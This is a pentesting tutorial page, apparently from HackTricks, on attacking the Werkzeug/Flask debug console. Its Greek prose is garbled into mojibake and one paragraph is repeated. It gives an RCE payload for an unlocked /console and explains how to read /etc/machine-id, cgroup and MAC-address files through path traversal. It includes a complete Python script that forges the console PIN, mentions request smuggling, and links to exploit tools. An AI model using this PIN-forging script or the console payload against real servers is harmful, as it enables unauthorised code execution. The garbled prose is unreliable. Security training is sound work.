# Werkzeug / Flask Debug

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Î†Î¼ÎµÏƒÎ· Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Î³Î¹Î± Î±Î¾Î¹Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ & pentesting**. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Î¼Î¹Î± Ï€Î»Î®ÏÎ· pentest Î±Ï€ÏŒ Î¿Ï€Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ Î¼Îµ 20+ ÎµÏÎ³Î±Î»ÎµÎ¯Î± & Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ Ï€Î¿Ï… ÎºÏ…Î¼Î±Î¯Î½Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· Î­Ï‰Ï‚ Î±Î½Î±Ï†Î¿ÏÎ¬. Î”ÎµÎ½ Î±Î½Ï„Î¹ÎºÎ±Î¸Î¹ÏƒÏ„Î¿ÏÎ¼Îµ Ï„Î¿Ï…Ï‚ pentesters - Î±Î½Î±Ï€Ï„ÏÏƒÏƒÎ¿Ï…Î¼Îµ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î±, Î¼Î¿Î½Î¬Î´ÎµÏ‚ Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚ & ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Î³Î¹Î± Î½Î± Ï„Î¿Ï…Ï‚ Î´ÏÏƒÎ¿Ï…Î¼Îµ Ï€Î¯ÏƒÏ‰ Î»Î¯Î³Î¿ Ï‡ÏÏŒÎ½Î¿ Î³Î¹Î± Î½Î± ÎµÎ¼Î²Î±Î¸ÏÎ½Î¿Ï…Î½, Î½Î± Î±Î½Î¿Î¯Î¾Î¿Ï…Î½ shells ÎºÎ±Î¹ Î½Î± Î´Î¹Î±ÏƒÎºÎµÎ´Î¬ÏƒÎ¿Ï…Î½.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Console RCE

Î•Î¬Î½ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î· Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ·, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ `/console` ÎºÎ±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î±ÏÎºÎµÏ„Î¬ exploits ÏƒÏ„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿ ÏŒÏ€Ï‰Ï‚ [Î±Ï…Ï„ÏŒ](https://github.com/its-arun/Werkzeug-Debug-RCE) Î® Î­Î½Î± ÏƒÏ„Î¿ metasploit.

## Pin Protected - Path Traversal

Î£Îµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚, Ï„Î¿ **`/console`** endpoint Î¸Î± ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏ…Î¼Î­Î½Î¿ Î¼Îµ Î­Î½Î± pin. Î‘Î½ Î­Ï‡ÎµÏ„Îµ Î¼Î¹Î± **ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï…**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ pin.

### Werkzeug Console PIN Exploit

Î•Ï€Î¹Î²Î¬Î»ÎµÏ„Îµ Î¼Î¹Î± ÏƒÎµÎ»Î¯Î´Î± ÏƒÏ†Î¬Î»Î¼Î±Ï„Î¿Ï‚ debug ÏƒÏ„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î³Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
ÎˆÎ½Î± Î¼Î®Î½Ï…Î¼Î± ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ "ÎºÎ»ÎµÎ¹Î´Ï‰Î¼Î­Î½Î· ÎºÎ¿Î½ÏƒÏŒÎ»Î±" ÏƒÏ…Î½Î±Î½Ï„Î¬Ï„Î±Î¹ ÏŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î· Î´Î¹ÎµÏ€Î±Ï†Î® Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ·Ï‚ Ï„Î¿Ï… Werkzeug, Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· Î³Î¹Î± Î­Î½Î±Î½ ÎºÏ‰Î´Î¹ÎºÏŒ PIN Î³Î¹Î± Î½Î± Î¾ÎµÎºÎ»ÎµÎ¹Î´ÏÏƒÎµÏ„Îµ Ï„Î·Î½ ÎºÎ¿Î½ÏƒÏŒÎ»Î±. Î ÏÎ¿Ï„ÎµÎ¯Î½ÎµÏ„Î±Î¹ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ PIN Ï„Î·Ï‚ ÎºÎ¿Î½ÏƒÏŒÎ»Î±Ï‚ Î±Î½Î±Î»ÏÎ¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ Î±Î»Î³ÏŒÏÎ¹Î¸Î¼Î¿ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±Ï‚ PIN ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Î±ÏÏ‡Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ·Ï‚ Ï„Î¿Ï… Werkzeug (`__init__.py`). ÎœÎ·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒÏ‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±Ï‚ PIN Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼ÎµÎ»ÎµÏ„Î·Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î¿ [**Werkzeug source code repository**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), Î±Î½ ÎºÎ±Î¹ ÏƒÏ…Î½Î¹ÏƒÏ„Î¬Ï„Î±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ ÎºÏ‰Î´Î¹ÎºÏŒ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î¼Î­ÏƒÏ‰ Î¼Î¹Î±Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î»ÏŒÎ³Ï‰ Ï€Î¹Î¸Î±Î½ÏÎ½ Î´Î¹Î±Ï†Î¿ÏÏÎ½ ÎµÎºÎ´ÏŒÏƒÎµÏ‰Î½.

Î“Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ PIN Ï„Î·Ï‚ ÎºÎ¿Î½ÏƒÏŒÎ»Î±Ï‚, Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ Î´ÏÎ¿ ÏƒÏÎ½Î¿Î»Î± Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½, `probably_public_bits` ÎºÎ±Î¹ `private_bits`:

#### **`probably_public_bits`**

* **`username`**: Î‘Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÏ„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Ï€Î¿Ï… Î¾ÎµÎºÎ¯Î½Î·ÏƒÎµ Ï„Î· ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± Flask.
* **`modname`**: Î£Ï…Î½Î®Î¸Ï‰Ï‚ Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï‰Ï‚ `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Î“ÎµÎ½Î¹ÎºÎ¬ ÎµÏ€Î¹Î»ÏÎµÏ„Î±Î¹ ÏƒÎµ **Flask**.
* **`getattr(mod, '__file__', None)`**: Î‘Î½Ï„Î¹Ï€ÏÎ¿ÏƒÏ‰Ï€ÎµÏÎµÎ¹ Ï„Î·Î½ Ï€Î»Î®ÏÎ· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï€ÏÎ¿Ï‚ Ï„Î¿ `app.py` ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï… Flask (Ï€.Ï‡., `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Î‘Î½ Ï„Î¿ `app.py` Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÏ†Î±ÏÎ¼ÏŒÏƒÎ¹Î¼Î¿, **Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Ï„Î¿ `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: Î‘Î½Î±ÎºÏ„Î¬ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· MAC Ï„Î·Ï‚ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ±Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚, Î¼Îµ Ï„Î¿ `str(uuid.getnode())` Î½Î± Ï„Î·Î½ Î¼ÎµÏ„Î±Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î´ÎµÎºÎ±Î´Î¹ÎºÎ® Î¼Î¿ÏÏ†Î®.
* Î“Î¹Î± **Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· MAC Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®**, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ Ï„Î· Î´ÏÎ±ÏƒÏ„Î®ÏÎ¹Î± Î´Î¹ÎºÏ„Ï…Î±ÎºÎ® Î´Î¹ÎµÏ€Î±Ï†Î® Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® (Ï€.Ï‡., `ens3`). Î£Îµ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Î±Î²ÎµÎ²Î±Î¹ÏŒÏ„Î·Ï„Î±Ï‚, **Î´Î¹Î±ÏÏÎµÏÏƒÏ„Îµ Ï„Î¿ `/proc/net/arp`** Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ ID Ï„Î·Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î®Ï‚, ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± **ÎµÎ¾Î¬Î³ÎµÏ„Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· MAC** Î±Ï€ÏŒ **`/sys/class/net/<device id>/address`**.
*   Î— Î¼ÎµÏ„Î±Ï„ÏÎ¿Ï€Î® Î¼Î¹Î±Ï‚ Î´ÎµÎºÎ±ÎµÎ¾Î±Î´Î¹ÎºÎ®Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ MAC ÏƒÎµ Î´ÎµÎºÎ±Î´Î¹ÎºÎ® Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:

```python
# Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: Î£Ï…Î½Î´Ï…Î¬Î¶ÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î±Ï€ÏŒ Ï„Î¿ `/etc/machine-id` Î® Ï„Î¿ `/proc/sys/kernel/random/boot_id` Î¼Îµ Ï„Î·Î½ Ï€ÏÏÏ„Î· Î³ÏÎ±Î¼Î¼Î® Ï„Î¿Ï… `/proc/self/cgroup` Î¼ÎµÏ„Î¬ Ï„Î·Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± ÎºÎ¬Î¸ÎµÏ„Î¿ (`/`).

<details>

<summary>ÎšÏÎ´Î¹ÎºÎ±Ï‚ Î³Î¹Î± `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Î‘Ï†Î¿Ï ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏ‰Î¸Î¿ÏÎ½ ÏŒÎ»Î± Ï„Î± Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±, Ï„Î¿ exploit script Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±Ï‡Î¸ÎµÎ¯ Ï„Î¿ PIN Ï„Î·Ï‚ ÎºÎ¿Î½ÏƒÏŒÎ»Î±Ï‚ Werkzeug:

Î‘Ï†Î¿Ï ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏ‰Î¸Î¿ÏÎ½ ÏŒÎ»Î± Ï„Î± Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±, Ï„Î¿ exploit script Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±Ï‡Î¸ÎµÎ¯ Ï„Î¿ PIN Ï„Î·Ï‚ ÎºÎ¿Î½ÏƒÏŒÎ»Î±Ï‚ Werkzeug. Î¤Î¿ script Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î± ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏ‰Î¼Î­Î½Î± `probably_public_bits` ÎºÎ±Î¹ `private_bits` Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± hash, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï…Ï€Î¿Î²Î¬Î»Î»ÎµÏ„Î±Î¹ ÏƒÎµ Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±Ï‡Î¸ÎµÎ¯ Ï„Î¿ Ï„ÎµÎ»Î¹ÎºÏŒ PIN. Î Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Python Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Î‘Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€Î±ÏÎ¬Î³ÎµÎ¹ Ï„Î¿ PIN Î¼Îµ Ï„Î¿ Î½Î± Î­Ï‡ÎµÎ¹ Ï„Î¿ hash Ï„Ï‰Î½ ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼Î­Î½Ï‰Î½ bits, Ï€ÏÎ¿ÏƒÎ¸Î­Ï„Î¿Î½Ï„Î±Ï‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± salts (`cookiesalt` ÎºÎ±Î¹ `pinsalt`), ÎºÎ±Î¹ Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Î­Î¾Î¿Î´Î¿. Î•Î¯Î½Î±Î¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Î½Î± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯ ÏŒÏ„Î¹ Î¿Î¹ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ­Ï‚ Ï„Î¹Î¼Î­Ï‚ Î³Î¹Î± `probably_public_bits` ÎºÎ±Î¹ `private_bits` Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î·Î¸Î¿ÏÎ½ Î¼Îµ Î±ÎºÏÎ¯Î²ÎµÎ¹Î± Î±Ï€ÏŒ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± ÏƒÏ„ÏŒÏ‡Î¿ Î³Î¹Î± Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¹ÏƒÏ„ÎµÎ¯ ÏŒÏ„Î¹ Ï„Î¿ Ï€Î±ÏÎ±Î³ÏŒÎ¼ÎµÎ½Î¿ PIN Ï„Î±Î¹ÏÎ¹Î¬Î¶ÎµÎ¹ Î¼Îµ Î±Ï…Ï„ÏŒ Ï€Î¿Ï… Î±Î½Î±Î¼Î­Î½ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î·Î½ ÎºÎ¿Î½ÏƒÏŒÎ»Î± Werkzeug.

{% hint style="success" %}
Î‘Î½ ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¼Î¹Î± **Ï€Î±Î»Î¹Î¬ Î­ÎºÎ´Î¿ÏƒÎ·** Ï„Î¿Ï… Werkzeug, Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Î½Î± Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î¿Î½ **Î±Î»Î³ÏŒÏÎ¹Î¸Î¼Î¿ hashing ÏƒÎµ md5** Î±Î½Ï„Î¯ Î³Î¹Î± sha1.
{% endhint %}

## Werkzeug Unicode Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚

ÎŒÏ€Ï‰Ï‚ Ï€Î±ÏÎ±Ï„Î·ÏÎ®Î¸Î·ÎºÎµ ÏƒÎµ [**Î±Ï…Ï„ÏŒ Ï„Î¿ Î¶Î®Ï„Î·Î¼Î±**](https://github.com/pallets/werkzeug/issues/2833), Ï„Î¿ Werkzeug Î´ÎµÎ½ ÎºÎ»ÎµÎ¯Î½ÎµÎ¹ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Î¼Îµ Unicode Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ ÏƒÏ„Î¹Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚. ÎšÎ±Î¹ ÏŒÏ€Ï‰Ï‚ ÎµÎ¾Î·Î³Î®Î¸Î·ÎºÎµ ÏƒÎµ [**Î±Ï…Ï„Î® Ï„Î· Î³ÏÎ±Ï†Î®**](https://mizu.re/post/twisty-python), Î±Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± CL.0 Request Smuggling.

Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎµÏ€ÎµÎ¹Î´Î®, ÏƒÏ„Î¿ Werkzeug ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÏƒÏ„Î±Î»Î¿ÏÎ½ Î¼ÎµÏÎ¹ÎºÎ¿Î¯ **Unicode** Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ ÎºÎ±Î¹ Î±Ï…Ï„ÏŒ Î¸Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹ **ÏƒÏ€Î¬ÏƒÎ¹Î¼Î¿** Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Î½ Î· ÏƒÏÎ½Î´ÎµÏƒÎ· HTTP Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ Î¼Îµ Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î± **`Connection: keep-alive`**, Ï„Î¿ ÏƒÏÎ¼Î± Ï„Î¿Ï… Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ Î´ÎµÎ½ Î¸Î± Î´Î¹Î±Î²Î±ÏƒÏ„ÎµÎ¯ ÎºÎ±Î¹ Î· ÏƒÏÎ½Î´ÎµÏƒÎ· Î¸Î± Ï€Î±ÏÎ±Î¼ÎµÎ¯Î½ÎµÎ¹ Î±Î½Î¿Î¹Ï‡Ï„Î®, Î¿Ï€ÏŒÏ„Îµ Ï„Î¿ **ÏƒÏÎ¼Î±** Ï„Î¿Ï… Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ Î¸Î± Î¸ÎµÏ‰ÏÎ·Î¸ÎµÎ¯ Ï‰Ï‚ Ï„Î¿ **ÎµÏ€ÏŒÎ¼ÎµÎ½Î¿ HTTP Î±Î¯Ï„Î·Î¼Î±**.

## Î‘Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

